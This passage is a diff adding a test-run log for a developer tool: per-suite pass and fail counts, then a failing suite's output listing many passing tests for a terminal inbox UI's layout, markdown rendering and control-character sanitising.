@@ -1,0 +1,1162 @@
+sha ea196bb283bf247caa9efa2d1e8fe2c8a16e2e4b clean=yes
+OK      6 tests     0.6s  test_advisor_rules
+OK     33 tests    13.7s  test_ca_autoswitch
+OK     23 tests     1.9s  test_ca_install
+OK     62 tests    28.2s  test_ca_launchers
+OK      9 tests    17.9s  test_ca_win
+OK      8 tests     1.3s  test_crlf_squad_files
+OK      3 tests     0.4s  test_designer_handoff
+OK      7 tests     5.9s  test_dev_rules_size
+OK      7 tests     0.1s  test_hooks_json
+OK     28 tests     1.1s  test_instructions
+OK     13 tests     0.1s  test_manager_inbox_read
+OK      9 tests     0.4s  test_manager_m_l
+OK      4 tests     0.1s  test_model_effort_settings
+OK      5 tests     0.9s  test_po_inbox_contract
+FAIL    2 tests    12.9s  test_po_inbox_mod
+OK      5 tests     0.6s  test_pod_contact_routes
+OK     10 tests     0.8s  test_pod_rules_process
+OK      4 tests     0.2s  test_process_citations
+FAIL    9 tests     0.2s  test_process_conversion
+OK      6 tests     0.1s  test_process_history
+OK      7 tests     0.1s  test_process_writing
+OK     31 tests     0.1s  test_processlint
+FAIL   13 tests    32.7s  test_qab_optional
+OK      7 tests     0.6s  test_retro_rules
+OK     24 tests     8.4s  test_run_suite
+OK     36 tests    48.4s  test_sizes
+OK     79 tests    21.8s  test_squad_close
+OK     48 tests     2.6s  test_squad_evidence
+OK     17 tests     1.0s  test_squad_label
+OK     18 tests     1.6s  test_squad_ledger
+OK     18 tests     0.4s  test_squad_log_message
+OK     24 tests     0.9s  test_squad_manager_guard
+OK     20 tests     1.2s  test_squad_migrate
+OK     18 tests     3.4s  test_squad_notify
+OK     21 tests     0.2s  test_squad_path_guard
+OK     21 tests     1.9s  test_squad_report_cli
+OK     16 tests     2.4s  test_squad_report_query
+OK     16 tests     4.1s  test_squad_respawn
+OK      3 tests     0.1s  test_squad_retire
+OK     67 tests    15.7s  test_squad_spawn
+OK     48 tests    21.8s  test_squad_start
+OK     20 tests     1.0s  test_squad_usage
+OK     10 tests     0.5s  test_squad_usage_hook
+OK     28 tests     5.0s  test_squadadopt
+OK     47 tests     2.0s  test_squadcompose
+FAIL   55 tests    10.6s  test_squadinbox
+OK     32 tests    12.9s  test_squadinbox_answer
+OK      5 tests     0.8s  test_squadinbox_body_crlf
+OK      8 tests     0.8s  test_squadinbox_win
+OK      4 tests     0.0s  test_squadio
+OK     18 tests     0.1s  test_squadlabel
+OK     31 tests     0.6s  test_squadprocess
+OK     26 tests     1.2s  test_squadprocess_apply
+OK     39 tests     0.1s  test_squadreport_collect
+OK     10 tests     0.1s  test_squadreport_digest
+OK      4 tests     0.1s  test_squadreport_embed
+OK      9 tests     0.1s  test_squadreport_html
+OK     15 tests     1.0s  test_squadreport_rollup
+OK     10 tests     3.7s  test_squadreport_rollup_ui
+OK     14 tests     0.1s  test_squadreport_tasks
+OK     40 tests    12.0s  test_squadreport_ui
+OK     51 tests     1.2s  test_squadrules
+OK     64 tests    12.6s  test_squadruntime
+FAIL   25 tests     1.7s  test_squadsettings
+OK      3 tests     0.1s  test_squadtranscript
+OK     19 tests     4.4s  test_squadupgrade
+OK     11 tests     1.1s  test_suite_rules_process
+OK      2 tests     0.3s  test_task_id_rule
+OK      9 tests     1.4s  test_team_lead_perms
+OK     10 tests     0.3s  test_team_lead_role
+OK     20 tests     1.9s  test_team_models
+OK     10 tests     0.1s  test_templates
+FAIL   12 tests     2.6s  test_utf8_helpers
+OK      4 tests     0.3s  test_win_utf8_process
+OK     11 tests     0.3s  test_windows_safe
+
+===== test_po_inbox_mod =====
+======================================================================
+FAIL: test_plugin_test_passes (test_po_inbox_mod.PoInboxModTest.test_plugin_test_passes)
+----------------------------------------------------------------------
+Traceback (most recent call last):
+  File "/home/chieule/workspace/squad/.worktrees/plugin/coachwait-closelocal/plugin-dev-cwcl-3/tests/test_po_inbox_mod.py", line 51, in test_plugin_test_passes
+    self.assertEqual(code, 0, out)
+    ~~~~~~~~~~~~~~~~^^^^^^^^^^^^^^
+AssertionError: 1 != 0 : 
+hooks/po-inbox/contract.test.ts:
+(pass) contract-home fixture > parses, with every item kept [7.45ms]
+(pass) contract-home fixture > an extra key anywhere is ignored [0.71ms]
+(pass) contract-home fixture > a missing key on an item, a missing top-level key and version 2 are errors [2.38ms]
+
+hooks/po-inbox/core-visual.test.ts:
+(pass) TONE > theme keys [6.59ms]
+(pass) recommendedKey (V-11 table, expected values written out) > "(c), built (a) first: the long reason" [1.53ms]
+(pass) recommendedKey (V-11 table, expected values written out) > "(c) yes" [2.02ms]
+(pass) recommendedKey (V-11 table, expected values written out) > "  (c) yes" [0.23ms]
+(pass) recommendedKey (V-11 table, expected values written out) > "\t(c) yes" [0.14ms]
+(pass) recommendedKey (V-11 table, expected values written out) > " (c) yes" [0.46ms]
+(pass) recommendedKey (V-11 table, expected values written out) > "(a) no, (b) is worse" [0.61ms]
+(pass) recommendedKey (V-11 table, expected values written out) > "(C) yes" [0.15ms]
+(pass) recommendedKey (V-11 table, expected values written out) > "c) yes" [0.14ms]
+(pass) recommendedKey (V-11 table, expected values written out) > "Option c" [0.11ms]
+(pass) recommendedKey (V-11 table, expected values written out) > "c. yes" [0.14ms]
+(pass) recommendedKey (V-11 table, expected values written out) > "(a)+(b)" [0.14ms]
+(pass) recommendedKey (V-11 table, expected values written out) > "(a)/(b)" [0.15ms]
+(pass) recommendedKey (V-11 table, expected values written out) > "(a) / (b)" [0.13ms]
+(pass) recommendedKey (V-11 table, expected values written out) > "(a), (b)" [0.13ms]
+(pass) recommendedKey (V-11 table, expected values written out) > "(a),(b)" [0.17ms]
+(pass) recommendedKey (V-11 table, expected values written out) > "(a) and (b)" [0.15ms]
+(pass) recommendedKey (V-11 table, expected values written out) > "(a) AND (b)" [0.22ms]
+(pass) recommendedKey (V-11 table, expected values written out) > "(a) or (b)" [0.16ms]
+(pass) recommendedKey (V-11 table, expected values written out) > "(a)and(b)" [0.18ms]
+(pass) recommendedKey (V-11 table, expected values written out) > "(a)" [0.17ms]
+(pass) recommendedKey (V-11 table, expected values written out) > "(a)text" [0.20ms]
+(pass) recommendedKey (V-11 table, expected values written out) > "(b) yes (a) no" [0.17ms]
+(pass) recommendedKey (V-11 table, expected values written out) > "(z) yes" [0.16ms]
+(pass) recommendedKey (V-11 table, expected values written out) > "Reply 'all recs' to take every recommendation" [0.16ms]
+(pass) recommendedKey (V-11 table, expected values written out) > "" [0.15ms]
+(pass) recommendedKey (V-11 table, expected values written out) > (c) with options [a,b] is none [0.33ms]
+(pass) recommendedKey (V-11 table, expected values written out) > (a) with options null is none [0.22ms]
+(pass) recommendedKey (V-11 table, expected values written out) > (a) with options [] is none [0.18ms]
+(pass) recommendedKey (V-11 table, expected values written out) > duplicate option keys is none [0.16ms]
+(pass) recommendedKey (V-11 table, expected values written out) > rec null is none [0.17ms]
+(pass) cellWidth > ascii [0.36ms]
+(pass) cellWidth > empty [0.19ms]
+(pass) cellWidth > cjk [0.17ms]
+(pass) cellWidth > hangul [0.15ms]
+(pass) cellWidth > ideographic comma [0.20ms]
+(pass) cellWidth > fullwidth A [0.16ms]
+(pass) cellWidth > emoji is one code point [0.16ms]
+(pass) cellWidth > astral plus combining mark [0.87ms]
+(pass) cellWidth > combining accent [0.28ms]
+(pass) cellWidth > zero-width space [0.16ms]
+(pass) cellWidth > check mark and warning sign stay 1 (the inbox glyphs) [0.13ms]
+(pass) cellWidth > emoji presentation: check, cross, star, hourglass, melting face [0.15ms]
+(pass) cellWidth > emoji presentation: low ranges [0.24ms]
+(pass) cellWidth > emoji presentation: dingbats [0.25ms]
+(pass) cellWidth > regional indicators and the 1FA70 block [0.20ms]
+(pass) cellWidth > test tube [0.16ms]
+(pass) cellWidth > pinned: heart + VS16 is 1 + 0 [0.50ms]
+(pass) cellWidth > pinned: ZWJ family is 2+2+2 plus two zero-width joiners (0) [0.18ms]
+(pass) rowsFor > empty is one row [0.34ms]
+(pass) rowsFor > exact fit is one row [0.44ms]
+(pass) rowsFor > one over is two [1.33ms]
+(pass) rowsFor > words wrap on spaces [0.53ms]
+(pass) rowsFor > word fits with its space exactly [0.41ms]
+(pass) rowsFor > a long word is hard-wrapped [1.70ms]
+(pass) rowsFor > embedded newlines count per line, empty lines are one row [5.62ms]
+(pass) rowsFor > CJK counts two cells [0.51ms]
+(pass) rowsFor > a wide char at the end of a row starts the next row [1.07ms]
+(pass) rowsFor > a wide char never splits across rows [1.10ms]
+(pass) rowsFor > after a row filled to the full width the next row starts one cell in (QAB F1) [3.31ms]
+(pass) rowsFor > the two real titles whose first row is 36 cells: 3 rows uncut, 2 after clipRows (QAB F1) [9.71ms]
+(pass) rowsFor > leading and repeated spaces never shrink the count [0.49ms]
+(pass) rowsFor > cols 0 and negative do not hang [0.19ms]
+(pass) rowsFor > is never smaller than a reference wrap (300 seeded strings, cols 30..100) [42.06ms]
+(pass) tableLayout > aligned at 80 [0.73ms]
+(pass) tableLayout > aligned at 60 [0.48ms]
+(pass) tableLayout > stacked at 59 [0.49ms]
+(pass) tableLayout > stacked at 40 [0.34ms]
+(pass) tableLayout > stacked at 30 [0.25ms]
+(pass) tableLayout > aligned widths are the widest cell per column [0.50ms]
+(pass) tableLayout > exactly fits and one over at 60 [0.86ms]
+(pass) tableLayout > CJK and emoji cells use cell widths [5.46ms]
+(pass) tableLayout > stacked keeps every cell once, in order [0.94ms]
+(pass) tableLayout > ragged rows: short rows get empty cells, long rows get an empty column name [0.59ms]
+(pass) tableLayout > one column, zero rows, empty cells [3.72ms]
+(pass) capGroup > 0 items: 0 shown, +0 [0.81ms]
+(pass) capGroup > 7 items: 7 shown, +0 [0.32ms]
+(pass) capGroup > 8 items: 7 shown, +1 [0.19ms]
+(pass) capGroup > 9 items: 7 shown, +2 [0.17ms]
+(pass) capGroup > 12 items: 7 shown, +5 [0.54ms]
+(pass) capGroup > expanded shows all, in order [0.83ms]
+(pass) capGroup > returns new arrays, input untouched [0.77ms]
+(pass) bodyBudget > rows minus chrome [0.67ms]
+(pass) bodyBudget > floor defaults to 3 [2.77ms]
+(pass) bodyBudget > floor is an argument [0.21ms]
+(pass) bodyBudget > missing or NaN rows fall back to 20 [0.19ms]
+(pass) clipCells / recPointer > clipCells 30 cols of aaaa… [1.94ms]
+(pass) clipCells / recPointer > recPointer 30 cols unmarked of aaaa… [1.51ms]
+(pass) clipCells / recPointer > clipCells 30 cols of 漢字漢字… [0.33ms]
+(pass) clipCells / recPointer > recPointer 30 cols unmarked of 漢字漢字… [0.39ms]
+(pass) clipCells / recPointer > clipCells 30 cols of 😀😀… [0.43ms]
+(pass) clipCells / recPointer > recPointer 30 cols unmarked of 😀😀… [1.72ms]
+(pass) clipCells / recPointer > clipCells 30 cols of 漢a😀… [1.98ms]
+(pass) clipCells / recPointer > recPointer 30 cols unmarked of 漢a😀… [1.62ms]
+(pass) clipCells / recPointer > clipCells 40 cols of aaaa… [7.27ms]
+(pass) clipCells / recPointer > recPointer 40 cols unmarked of aaaa… [6.28ms]
+(pass) clipCells / recPointer > clipCells 40 cols of 漢字漢字… [6.45ms]
+(pass) clipCells / recPointer > recPointer 40 cols unmarked of 漢字漢字… [3.45ms]
+(pass) clipCells / recPointer > clipCells 40 cols of 😀😀… [2.97ms]
+(pass) clipCells / recPointer > recPointer 40 cols unmarked of 😀😀… [1.97ms]
+(pass) clipCells / recPointer > clipCells 40 cols of 漢a😀… [2.63ms]
+(pass) clipCells / recPointer > recPointer 40 cols unmarked of 漢a😀… [2.15ms]
+(pass) clipCells / recPointer > a wide char at the cut is dropped whole [0.74ms]
+(pass) clipCells / recPointer > exact fit has no ellipsis [0.45ms]
+(pass) clipCells / recPointer > one over is cut [1.28ms]
+(pass) clipCells / recPointer > cols < 1 is empty [3.13ms]
+(pass) clipCells / recPointer > marked rec points at its key [0.50ms]
+(pass) clipCells / recPointer > marked pointer is clipped at a narrow width [0.64ms]
+(pass) clipCells / recPointer > unmarked rec is its first line [4.40ms]
+(pass) clipCells / recPointer > null and empty rec give an empty row [0.81ms]
+(pass) clipCells / recPointer > control characters are the caller's job: sanitize first, then the pointer holds none [0.73ms]
+(pass) clipCells / recPointer > a [rec] line stays literal [0.27ms]
+(pass) tones (V-15) > kindTone [0.72ms]
+(pass) tones (V-15) > kindTone: only an open answer item is amber, over every kind/state in the contract fixtures [2.80ms]
+(pass) tones (V-15) > blocks "" is dim [0.47ms]
+(pass) tones (V-15) > blocks "nothing" is dim [0.32ms]
+(pass) tones (V-15) > blocks "none" is dim [0.28ms]
+(pass) tones (V-15) > blocks "-" is dim [0.15ms]
+(pass) tones (V-15) > blocks "—" is dim [0.33ms]
+(pass) tones (V-15) > blocks " Nothing " is dim [0.21ms]
+(pass) tones (V-15) > blocks PI-04 is bad [1.97ms]
+(pass) tones (V-15) > blocks spawning the pod is bad [0.57ms]
+(pass) tones (V-15) > blocks nothing else is bad [0.82ms]
+(pass) tones (V-15) > outcomeTone over every done kind in the real contract fixtures [5.04ms]
+(pass) tones (V-15) > answered in chat (source chat) is good [0.73ms]
+(pass) tones (V-15) > unknown kind and no outcome are none, never throw [0.29ms]
+(pass) [rec] indent (QAB F2): counted and clipped with the indent > an indent that pushes the line over a row boundary adds the row [2.21ms]
+(pass) [rec] indent (QAB F2): counted and clipped with the indent > the indent is capped at 8 spaces [1.97ms]
+(pass) [rec] indent (QAB F2): counted and clipped with the indent > a rec line taller than the budget is clipped with its indent [39.73ms]
+
+hooks/po-inbox/core.test.ts:
+(pass) parseSnapshot > accepts fixture contract-empty [3.96ms]
+(pass) parseSnapshot > accepts fixture contract-home [1.25ms]
+(pass) parseSnapshot > accepts fixture contract-mixed [0.69ms]
+(pass) parseSnapshot > ignores unknown extra keys [0.88ms]
+(pass) parseSnapshot > rejects invalid JSON and a non-object [0.86ms]
+(pass) parseSnapshot > rejects any other version [0.62ms]
+(pass) parseSnapshot > rejects a missing items [0.18ms]
+(pass) parseSnapshot > rejects a missing counts [0.13ms]
+(pass) parseSnapshot > rejects a missing home [0.18ms]
+(pass) parseSnapshot > rejects a missing now [0.17ms]
+(pass) parseSnapshot > rejects a missing errors [0.13ms]
+(pass) parseSnapshot > rejects: items not a list [0.18ms]
+(pass) parseSnapshot > rejects: counts not numbers [0.14ms]
+(pass) parseSnapshot > rejects: item id not a string [0.28ms]
+(pass) parseSnapshot > rejects: item title missing [0.20ms]
+(pass) parseSnapshot > rejects: unknown kind [0.21ms]
+(pass) parseSnapshot > rejects: unknown state [0.24ms]
+(pass) parseSnapshot > rejects: options not a list [0.23ms]
+(pass) parseSnapshot > rejects: option without key [0.22ms]
+(pass) parseSnapshot > rejects: flags not strings [0.17ms]
+(pass) parseSnapshot > rejects: answer text not a string [0.20ms]
+(pass) parseSnapshot > rejects: answer source unknown [0.22ms]
+(pass) parseSnapshot > rejects: answer delivered_ts a number [0.18ms]
+(pass) parseSnapshot > rejects: done kind missing [0.18ms]
+(pass) parseSnapshot > rejects: item null [0.18ms]
+(pass) newOpenIds > a first load has none [0.80ms]
+(pass) newOpenIds > an unchanged snapshot has none [0.61ms]
+(pass) newOpenIds > a new open id is reported, a new done one is not, a known one is not [0.35ms]
+(pass) describePrompt > keeps the answer verbatim: multi-line [0.34ms]
+(pass) describePrompt > keeps the answer verbatim: quotes [0.28ms]
+(pass) describePrompt > keeps the answer verbatim: backticks [0.49ms]
+(pass) describePrompt > keeps the answer verbatim: pipes [0.14ms]
+(pass) describePrompt > keeps the answer verbatim: emoji [0.12ms]
+(pass) describePrompt > keeps the answer verbatim: CRLF [0.79ms]
+(pass) describePrompt > keeps the answer verbatim: header lookalike [0.20ms]
+(pass) describePrompt > keeps the answer verbatim: leading and trailing blanks [0.17ms]
+(pass) describePrompt > collapses line breaks and controls in the title to one line [0.48ms]
+(pass) sanitize and oneLine > sanitize strips ESC and C0/C1 controls but keeps newline and tab [0.21ms]
+(pass) sanitize and oneLine > sanitize turns CRLF into newline [0.16ms]
+(pass) sanitize and oneLine > oneLine joins words and drops separators [0.16ms]
+(pass) fit: cuts to the width and ends with an ellipsis; short text is whole [0.69ms]
+(pass) ageOf: now, minutes, hours, days (60 days stays days) [6.57ms]
+(pass) stamp: local date and time; a day-precision source is date only [0.90ms]
+(pass) sanitize strips bidi controls and keeps tab and newline [0.21ms]
+(pass) parseAdd: one add call only [1.22ms]
+(pass) parseAdd: the heredoc operator counts only outside quotes (QAW F1) [1.15ms]
+(pass) parseAdd: only a quoted delimiter collapses (QAW F2) [0.73ms]
+(pass) parseAdd: the first word is pinned (QAW F3) [0.49ms]
+(pass) parseAdd: the collapsed title is sanitised (QAW F4) [0.34ms]
+(pass) parseAdd: the delimiter is the whole shell word (QAW R2-F1) [0.78ms]
+(pass) parseAdd: only <<'WORD' or <<"WORD" closed by an exact line collapses (TL round 2) [0.99ms]
+
+hooks/po-inbox/done.test.ts:
+(pass) the contract fixtures hold every done kind [4.53ms]
+(pass) outcome word colour: fixture done item 0 (answered-file) [300.41ms]
+(pass) outcome word colour: fixture done item 1 (answered-file) [281.70ms]
+(pass) outcome word colour: fixture done item 2 (answered-file) [165.47ms]
+(pass) outcome word colour: fixture done item 3 (answered-file) [122.65ms]
+(pass) outcome word colour: fixture done item 4 (answered) [121.74ms]
+(pass) outcome word colour: fixture done item 5 (removed) [92.53ms]
+(pass) outcome word colour: fixture done item 6 (withdrawn) [107.33ms]
+(pass) outcome word colour: fixture done item 7 (answered) [144.32ms]
+(pass) outcome word colour: fixture done item 8 (answered) [147.77ms]
+(pass) outcome word colour: fixture done item 9 (withdrawn) [108.11ms]
+(pass) outcome word colour: fixture done item 10 (read) [103.73ms]
+(pass) outcome word colour: fixture done item 11 (read) [119.67ms]
+(pass) answered in chat is green and ids, stamps are dim [109.16ms]
+(pass) heading carries the total, dim; newest first, equal stamps keep their order [95.19ms]
+(pass) fold edge: 7 rows show 7 and no button [110.91ms]
+(pass) fold edge: 8 rows show 7 and +1 more [109.66ms]
+(pass) fold edge: 12 rows show 7 and +5 more [113.74ms]
+(pass) +N more opens in place, is dim with no hotkey; digits stay on the first nine; leaving folds it again (T10) [190.20ms]
+(pass) a long withdrawn reason is wrapped whole, never dropped, at 80 columns [152.46ms]
+(pass) a long withdrawn reason is wrapped whole, never dropped, at 59 columns [136.86ms]
+(pass) a long withdrawn reason is wrapped whole, never dropped, at 40 columns [98.55ms]
+(pass) a long withdrawn reason is wrapped whole, never dropped, at 30 columns [95.12ms]
+(pass) a 300-character CJK reason wraps; the word withdrawn stays [109.38ms]
+(pass) ESC, OSC and U+202E in title and reason draw none [111.35ms]
+(pass) title clipping: ASCII title ends with … and row 1 fits 80 columns [121.77ms]
+(pass) title clipping: CJK title ends with … and row 1 fits 80 columns [93.62ms]
+(pass) title clipping: emoji title ends with … and row 1 fits 80 columns [79.74ms]
+(pass) title clipping: ASCII title ends with … and row 1 fits 59 columns [99.43ms]
+(pass) title clipping: CJK title ends with … and row 1 fits 59 columns [85.45ms]
+(pass) title clipping: emoji title ends with … and row 1 fits 59 columns [83.70ms]
+(pass) title clipping: ASCII title ends with … and row 1 fits 40 columns [105.80ms]
+(pass) title clipping: CJK title ends with … and row 1 fits 40 columns [117.16ms]
+(pass) title clipping: emoji title ends with … and row 1 fits 40 columns [114.39ms]
+(pass) title clipping: ASCII title ends with … and row 1 fits 30 columns [71.30ms]
+(pass) title clipping: CJK title ends with … and row 1 fits 30 columns [74.96ms]
+(pass) title clipping: emoji title ends with … and row 1 fits 30 columns [94.34ms]
+(pass) hotkey 9 and the three-space lead: the ninth row has digit 9 and no lead, the tenth the lead and no digit [113.63ms]
+(pass) an old atom without `more` draws the done list and expands without a crash [97.33ms]
+
+hooks/po-inbox/item.test.ts:
+(pass) V-01: the top block is first, in order, inside bodyRows 6 at 40 and 80 columns [500.68ms]
+(pass) 3.1c: the top block stays whole with no notice and with an error row, at both widths [306.75ms]
+(pass) 3.1d: bodyRows 14 and 10 (too small for the screen): no crash, every option drawn, the floor of body kept [163.44ms]
+(pass) M1: E1 open at 80 columns, 6 rows: top block, hint, floor of body, options as blocks, nothing picked [125.21ms]
+(pass) M3: picking (c) marks the block in words and the Select; picking (a) shows no warning (V-13) [185.49ms]
+(pass) M4: E2 (rec not marked): pointer with the start of the rec, the full rec once after the body, Your reply [182.40ms]
+(pass) M5: read item with markdown: structure, glyphs, chips, table, Mark read last [197.74ms]
+(pass) handled answered-waiting: the state is right after the title, before the body (V-03 v3.1), token per V-15 [309.34ms]
+(pass) handled delivered: the state is right after the title, before the body (V-03 v3.1), token per V-15 [281.27ms]
+(pass) handled answered in chat: the state is right after the title, before the body (V-03 v3.1), token per V-15 [302.44ms]
+(pass) handled answered in the file: the state is right after the title, before the body (V-03 v3.1), token per V-15 [306.24ms]
+(pass) handled withdrawn: the state is right after the title, before the body (V-03 v3.1), token per V-15 [291.68ms]
+(pass) handled read: the state is right after the title, before the body (V-03 v3.1), token per V-15 [285.48ms]
+(pass) handled removed: the state is right after the title, before the body (V-03 v3.1), token per V-15 [230.56ms]
+(pass) handled with options: blocks, the recommended mark stays, the PO pick in words (V-14a); answer shown plain (V-26) [170.90ms]
+(pass) handled: the kept line and the unconfirmed delivery keep today's words and tones [134.19ms]
+(pass) header: created under a day is `5h ago`; from a day the date and age wide, the age alone compact; now [176.17ms]
+(pass) title of 300 characters: 3 rows with an ellipsis, a `full title` row, Show all draws it whole (V-09) [195.92ms]
+(pass) hint counts the `… full title` row: cut title, uncut body at 80x7 shows `↓ more below`, a size that fits shows none [130.56ms]
+(pass) QAB F1: 80-char titles whose first row is exactly 36 cells: title cut at 2 rows, the pointer is inside the 6-row viewport at 36 columns [113.38ms]
+(pass) QAB F2: a `[rec]` line keeps its leading spaces [80.10ms]
+(pass) QAB F4: the label of a Show all row keeps a one-cell gap to the button (also when the row wraps at 30 columns) [101.43ms]
+(pass) QAB F3: only the header is clipped: the row says `… full header`, a whole title is not named [86.74ms]
+(pass) 3.1e: 300-char title, 2-row header, 40 columns, 6 rows: the pointer is inside the first viewport, the title shows 2 rows [158.53ms]
+(pass) blocks of 120 characters: the header is clipped to 2 rows, Show all draws it whole [144.22ms]
+(pass) empty body and a body equal to the title: no body rows, no Show all [89.35ms]
+(pass) notice: on the answer form directly above Your answer, the top block unchanged [85.44ms]
+(pass) notice on a read item sits under the Back row and the title cap drops to 2 rows [111.06ms]
+(pass) V-11: each row through the screen: mark and success only on the marked option; the rec appears once (V-12) [301.23ms]
+(pass) V-11: no rec at all: no pointer, no recommends line; options still drawn [77.53ms]
+(pass) V-14: options not parsed: the raw text whole, then the rec line, then Your reply; no Select [80.25ms]
+(pass) body cut: E1 at 6 rows shows the floor, then N more lines, then the options; Show all draws every word in order [105.13ms]
+(pass) body cut: a tall pane shows everything, no cut and no hint; the hint is on at 6 rows [121.82ms]
+(pass) body of 40 lines: the preview, N more lines, the answer controls still below the options [96.92ms]
+(pass) hostile bodies mount in under 2 s each, draw as text, and leave E1 intact [1067.07ms]
+(pass) V-27: ESC, OSC and U+202E in every drawn source are removed [305.93ms]
+(pass) bullet glyph by depth: 0 is •, 1 is ◦, 2 and deeper are ▪ [93.04ms]
+(pass) a tab in a code line draws as four spaces and counts rows that way [112.14ms]
+(pass) blank runs in a body draw one blank row, none at either end [73.39ms]
+(pass) FLOOR_ANSWER: an answer item keeps exactly 3 body rows at 6 rows, then the count of the lines left [81.29ms]
+(pass) "N more lines" counts a fence as lines + 2 and a table as rows + 2 [80.05ms]
+(pass) a first block taller than the budget is clipped to at most budget (3) rows [87.25ms]
+(pass) the PO answer keeps a blank line between paragraphs, and `**`, `#`, `|` literally [83.36ms]
+(pass) the unsent note label is dim, the note is plain; a refused send keeps both [130.70ms]
+(pass) a notice is clipped to 2 rows and a refusal draws in the error tone (V-15) [86.48ms]
+(pass) Select labels are cut to cols - 18 cells (at least 8), ending in … [109.82ms]
+(pass) V-18: no meaning colour on structure (heading, code, bold, table, bullet); only the [rec] tag is green [73.97ms]
+(pass) 3.6: no Text that draws body, code, table, option or recommendation text truncates [375.58ms]
+(pass) 3.9 colourless: blocked vs not, recommended, waiting vs delivered, error vs ok keep their words and glyphs [201.10ms]
+(pass) V-30: the item screen key map is today's (hotkeys, keys, no two Buttons share a hotkey) [148.25ms]
+(pass) V-26: pick + note and a free reply reach the CLI with the same argv and stdin as before [131.70ms]
+(pass) V-26: `**`, `#`, `|`, two blank lines and a trailing newline reach stdin byte for byte; any pick has the same shape [128.10ms]
+(pass) Send is a plain Button: no variant [115.25ms]
+
+hooks/po-inbox/list.test.ts:
+(pass) band answers + reads: the rung the width rule picks at 75 and 35 columns, one row [274.10ms]
+(pass) band reads only: the rung the width rule picks at 75 and 35 columns, one row [134.98ms]
+(pass) band answers only: the rung the width rule picks at 75 and 35 columns, one row [228.21ms]
+(pass) band waiting only: the rung the width rule picks at 75 and 35 columns, one row [142.56ms]
+(pass) band answers + waiting: the rung the width rule picks at 75 and 35 columns, one row [127.83ms]
+(pass) band problems only: the rung the width rule picks at 75 and 35 columns, one row [144.46ms]
+(pass) band: the four-kinds, two-digit case at 75 is rung 2, at 35 it wraps to exactly two rows with every count [145.16ms]
+(pass) band 4.8: 120 to answer, 15 waiting, 3 problems keeps every count at 40 and 35 columns (rung 6 wraps: the line is 42 cells), and survives 30 [453.92ms]
+(pass) band V-15: amber answer and waiting, red problems, reads and head uncoloured, separators plain; no `suggestion` anywhere [187.82ms]
+(pass) band: an error alone draws `1 problem` in red [125.53ms]
+(pass) list V-15: kind, blocks, age, ids, group titles and the heading carry their tone [134.86ms]
+(pass) fold edges: 0, 7, 8, 12+9, 7+0, 7+8 and the heading and band totals [243.06ms]
+(pass) fold: the shown rows are the first 7 of the CLI order, the hidden count is the total minus 7, digits stay on 1-9 [114.66ms]
+(pass) +N more opens only its group, in place; going to an item and back folds both again (T10) [191.63ms]
+(pass) fold: rows past 9 are pressable by key and carry three spaces instead of a digit; +N more is in the Tab order after the last shown row [147.16ms]
+(pass) fold: a refresh while expanded that drops the group to 7 has no stale +N more and no crash [191.69ms]
+(pass) fold: the waiting group folds too (own key)  [160.04ms]
+(pass) 2.10 an old atom without `more` draws, expands and navigates without a crash [138.74ms]
+(pass) keys: the list screen map is 1-9 over shown rows and d; the band has i; none repeats [151.72ms]
+(pass) row text: nothing wider than the pane at 80, 60, 59, 40 and 30; kind and blocks both visible; long text ends in an ellipsis [337.43ms]
+(pass) row text: age shows only when the whole line fits one row, short form under 60 columns [121.35ms]
+(pass) row text: the heading and group titles wrap (never clipped) and use the short words under 60 columns [119.86ms]
+(pass) sanitiser V-27: ESC, OSC and U+202E in title, blocks and an error row draw none, in the band and the list [155.77ms]
+
+hooks/po-inbox/markup.test.ts:
+(pass) must stay plain (V-05) > "#1 priority" is a plain paragraph, text unchanged [3.52ms]
+(pass) must stay plain (V-05) > "2024-10-16" is a plain paragraph, text unchanged [1.41ms]
+(pass) must stay plain (V-05) > "1.5" is a plain paragraph, text unchanged [0.50ms]
+(pass) must stay plain (V-05) > "-5" is a plain paragraph, text unchanged [0.30ms]
+(pass) must stay plain (V-05) > "*italic*" is a plain paragraph, text unchanged [0.29ms]
+(pass) must stay plain (V-05) > "_x_" is a plain paragraph, text unchanged [0.23ms]
+(pass) must stay plain (V-05) > "a ** b" is a plain paragraph, text unchanged [0.49ms]
+(pass) must stay plain (V-05) > "a lone ** here" is a plain paragraph, text unchanged [3.73ms]
+(pass) must stay plain (V-05) > "well-known" is a plain paragraph, text unchanged [0.61ms]
+(pass) must stay plain (V-05) > "-x no space" is a plain paragraph, text unchanged [0.40ms]
+(pass) must stay plain (V-05) > "#### four" is a plain paragraph, text unchanged [0.33ms]
+(pass) recognised elements > headings 1 to 3 [1.89ms]
+(pass) recognised elements > bullets with - and *, nested bullets keep depth [0.76ms]
+(pass) recognised elements > numbered list [0.54ms]
+(pass) recognised elements > bold and code spans [0.34ms]
+(pass) recognised elements > an unclosed or empty bold or code stays literal [0.46ms]
+(pass) recognised elements > a fenced block with a closing fence [0.42ms]
+(pass) recognised elements > a fenced block without a closing fence runs to the end [0.53ms]
+(pass) recognised elements > a pipe table: header, separator, rows [0.75ms]
+(pass) recognised elements > a table with a malformed separator is paragraphs [0.65ms]
+(pass) recognised elements > [rec] with leading spaces is a rec block; the tag itself is not kept [0.57ms]
+(pass) recognised elements > [REC], mid-line [rec] and [rec]x stay literal [0.56ms]
+(pass) recognised elements > <br> is a line break [0.23ms]
+(pass) never drop a word > fixture e1 [1.51ms]
+(pass) never drop a word > fixture e2 [1.25ms]
+(pass) never drop a word > fixture escalationsTable [1.23ms]
+(pass) never drop a word > fixture structured [0.39ms]
+(pass) never drop a word > fixture mustStayPlain [0.22ms]
+(pass) never drop a word > fixture wideTable [1.59ms]
+(pass) never drop a word > fixture cjkTable [0.60ms]
+(pass) never drop a word > fixture forty [0.87ms]
+(pass) never drop a word > fixture title300 [0.30ms]
+(pass) never drop a word > fixture crlf [0.34ms]
+(pass) never drop a word > fixture empty [0.24ms]
+(pass) never drop a word > fixture titleOnly [0.22ms]
+(pass) never drop a word > fixture onlyPipe [0.18ms]
+(pass) never drop a word > fixture onlyPipes [0.18ms]
+(pass) never drop a word > fixture unclosedFence [0.20ms]
+(pass) never drop a word > fixture esc [0.25ms]
+(pass) never drop a word > fixture osc [0.25ms]
+(pass) never drop a word > fixture rlo [0.31ms]
+(pass) never drop a word > the oracle is not vacuous: it sees words of a known body [0.44ms]
+(pass) never drop a word > 200 seeded random strings [25.84ms]
+(pass) totality edges > empty, newline-only and space-only bodies give blanks and plain text "" [0.55ms]
+(pass) table edges > ragged rows keep every cell [0.33ms]
+(pass) table edges > one column, empty cells, no trailing pipe, alignment colons [0.66ms]
